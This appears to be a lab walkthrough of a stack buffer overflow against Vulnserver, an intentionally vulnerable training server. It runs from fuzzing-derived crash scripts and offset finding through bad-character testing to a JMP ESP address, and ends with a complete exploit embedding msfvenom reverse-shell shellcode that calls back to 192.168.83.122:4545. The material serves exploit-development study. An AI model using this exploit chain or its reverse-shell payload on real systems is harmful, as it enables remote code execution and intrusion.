---
title: "TRUN EIP Overwrite"
layout: home
permalink: /vulnserver/trun/
collection: vulnserver
sidebar:
  nav: "main"
entries_layout: grid
classes: wide
---

Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.

```py
#!/usr/bin/python
# Vulnserver TRUN Python Script: POC
import socket
import os
import sys

crash="A"*5000

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, RDL"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?

![trun-eip-overwrite-media-01](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-01.png)

Additional testing proves that a 2500 byte buffer will also cause the Vulnserver application to crash due to an access violation. Create a 2500 byte patterned string to identify which part of the buffer is being stored in the EIP.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
```
Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.

```py
#!/usr/bin/python
# Vulnserver TRUN Python Script: Pattern
import socket
import os
import sys

crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>

buffer="TRUN /.:/"
buffer+=crash

print "Sending evil TRUN request to VulnServer, RDL"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.

<!--- <p align="center">
  <img src="/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png">
  </p>
--->

![trun-eip-overwrite-media-02 align="center"](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png)

EIP address is 386F4337. Use the Metasploit pattern offset utility to identify where the bytes are located in the 2500 byte buffer.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
```

![trun-eip-overwrite-media-03](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-03.png)

An exact match was found at offset 2003 bytes.  Modify the buffer in the POC script to now send 2003 "A" characters, 4 "B" characters, and 1993 "C" characters; this should overwrite EIP with 4 "B" characters while retaining a 4000 byte buffer size.

```py
#!/usr/bin/python
# Vulnserver TRUN Python Script: Control
import socket
import os
import sys

crash="A"*2003 + "B"*4 + "C"*1993

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, RDL"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```
Running the updated script against the Vulnserver crashes the server and produces the following EIP output in OllyDbg.

![trun-eip-overwrite-media-04](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-04.png)

![trun-eip-overwrite-media-05](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-05.png)

The crash buffer has successfully overwritten EIP with four (4) "B" "\x42" characters; we now have control over EIP. The next step is to identify any bad characters the might not work for our shellcode.

```py
#!/usr/bin/python
# Vulnserver TRUN Python Script: Bad Characters
import socket
import os
import sys

badchar=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

crash="A"*2003 + "B"*4 + badchar  #"C"*1993

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, RDL"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```
![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-06.png)

From looking at the output, we can tell that there are no bad characters other than \x00.

We now need to find a 'JMP ESP' instruction to jump to our potential shellcode.  Searching for a 'JMP ESP' instruction in the 'vulnserver.exe' instruction does not return any results. Vulnserver includes 'essfunc.dll'.

![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-08.png)

Searching for a 'JMP ESP' instruction returns a 'JMP ESP' instruction at  0x625011AF. To find this, double click on the module in the Executable modules window to open the module in the CPU view, then right click in the disassembler pane and select Search for ->Command or hit Ctrl–F. In the Find command box that appears, type “JMP ESP” and hit Find.

![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-09.png)

With a 'JMP ESP' instruction identified, replace our EIP filler of "B" characters with the address of the 'JMP ESP' instruction; ensure to use the Endian format. The next step is to generate a reverse shell using msfvenom and insert it into the Vulnserver TRUN Python Script and proceed it with a 15 character NOP sled.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.83.122 LPORT=4545 -b "\x00" -f c
```

```py
#!/usr/bin/python
import socket
import os
import sys

shellcode=("\xdd\xc6\xbd\x7f\x8f\x05\x6c\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x68\x17\x83\xc0\x04\x03\x17\x9c\xe7\x99\x1b\x4a\x65"
"\x61\xe3\x8b\x0a\xeb\x06\xba\x0a\x8f\x43\xed\xba\xdb\x01\x02"
"\x30\x89\xb1\x91\x34\x06\xb6\x12\xf2\x70\xf9\xa3\xaf\x41\x98"
"\x27\xb2\x95\x7a\x19\x7d\xe8\x7b\x5e\x60\x01\x29\x37\xee\xb4"
"\xdd\x3c\xba\x04\x56\x0e\x2a\x0d\x8b\xc7\x4d\x3c\x1a\x53\x14"
"\x9e\x9d\xb0\x2c\x97\x85\xd5\x09\x61\x3e\x2d\xe5\x70\x96\x7f"
"\x06\xde\xd7\x4f\xf5\x1e\x10\x77\xe6\x54\x68\x8b\x9b\x6e\xaf"
"\xf1\x47\xfa\x2b\x51\x03\x5c\x97\x63\xc0\x3b\x5c\x6f\xad\x48"
"\x3a\x6c\x30\x9c\x31\x88\xb9\x23\x95\x18\xf9\x07\x31\x40\x59"
"\x29\x60\x2c\x0c\x56\x72\x8f\xf1\xf2\xf9\x22\xe5\x8e\xa0\x2a"
"\xca\xa2\x5a\xab\x44\xb4\x29\x99\xcb\x6e\xa5\x91\x84\xa8\x32"
"\xd5\xbe\x0d\xac\x28\x41\x6e\xe5\xee\x15\x3e\x9d\xc7\x15\xd5"
"\x5d\xe7\xc3\x7a\x0d\x47\xbc\x3a\xfd\x27\x6c\xd3\x17\xa8\x53"
"\xc3\x18\x62\xfc\x6e\xe3\xe5\xc3\xc7\xb8\x75\xab\x15\x3e\x67"
"\xed\x93\xd8\xed\xfd\xf5\x73\x9a\x64\x5c\x0f\x3b\x68\x4a\x6a"
"\x7b\xe2\x79\x8b\x32\x03\xf7\x9f\xa3\xe3\x42\xfd\x62\xfb\x78"
"\x69\xe8\x6e\xe7\x69\x67\x93\xb0\x3e\x20\x65\xc9\xaa\xdc\xdc"
"\x63\xc8\x1c\xb8\x4c\x48\xfb\x79\x52\x51\x8e\xc6\x70\x41\x56"
"\xc6\x3c\x35\x06\x91\xea\xe3\xe0\x4b\x5d\x5d\xbb\x20\x37\x09"
"\x3a\x0b\x88\x4f\x43\x46\x7e\xaf\xf2\x3f\xc7\xd0\x3b\xa8\xcf"
"\xa9\x21\x48\x2f\x60\xe2\x78\x7a\x28\x43\x11\x23\xb9\xd1\x7c"
"\xd4\x14\x15\x79\x57\x9c\xe6\x7e\x47\xd5\xe3\x3b\xcf\x06\x9e"
"\x54\xba\x28\x0d\x54\xef")

crash="A"*2003 + "\xAF\x11\x50\x62" + "\x90"*15 + shellcode

buffer="TRUN /.:/"
buffer+=crash

print "[*] Sending evil TRUN request to VulnServer, RDL"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.83.128", 9999))
expl.send(buffer)
expl.close()
```

Launch Vulnserver.exe without attaching it to OllyDbg and launch the Vulnserver TRUN Python Script.

![trun-eip-overwrite-media-07](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-07.png)
